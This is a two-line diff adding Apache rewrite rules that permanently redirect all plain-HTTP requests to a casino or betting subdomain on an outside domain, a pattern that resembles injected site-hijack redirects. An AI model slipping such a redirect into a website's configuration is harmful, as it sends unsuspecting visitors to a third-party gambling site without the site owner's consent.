@@ -1,0 +1,2 @@
+RewriteCond %{HTTPS} !=on
+RewriteRule ^(.*)$ https://casinofdb.betandyou.info/$1 [R=301,L]
